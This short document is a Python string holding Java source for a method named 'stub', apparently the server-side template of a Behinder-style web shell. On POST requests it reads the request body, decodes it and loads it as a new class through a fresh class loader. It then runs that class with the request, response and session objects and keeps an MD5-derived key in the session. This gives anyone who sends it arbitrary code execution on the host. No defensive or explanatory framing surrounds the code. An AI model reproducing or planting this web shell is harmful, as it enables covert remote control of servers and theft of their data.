code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            this.getClass().getConstructor(ClassLoader.class)
                .newInstance(this.getClass().getClassLoader())
                .defineClass(b, 0, b.length).newInstance()
                .equals(pageContext);
        }
        return null;
    }
"""